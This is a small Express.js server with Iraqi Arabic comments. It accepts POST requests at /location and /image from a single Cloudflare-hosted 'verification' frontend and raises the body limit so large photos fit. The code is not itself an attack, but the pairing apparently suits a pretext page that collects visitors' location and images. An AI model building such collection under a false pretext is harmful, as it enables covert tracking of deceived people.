const express = require('express');
const cors = require('cors'); // استدعاء المكتبة اللي نزلتها هسه
const app = express();

// إعدادات الـ CORS
const corsOptions = {
  // هنا تخلي رابط الواجهة مالتك اللي سويته بـ Cloudflare
  origin: 'https://verification-frontend.sporran-toxin3k.workers.dev', 
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions)); // تفعيل الحماية بالسيرفر
app.use(express.json({ limit: '50mb' })); // هذا السطر كلش مهم حتى السيرفر يكدر يستلم الصورة لأن حجمها چبير

// ... هنا تكملة الكود مالتك القديم (الـ POST requests وغيرها)


app.post("/location", (req, res) => {
  console.log("Location:", req.body);
  res.send("OK");
});

app.post("/image", (req, res) => {
  console.log("Image received");
  res.send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));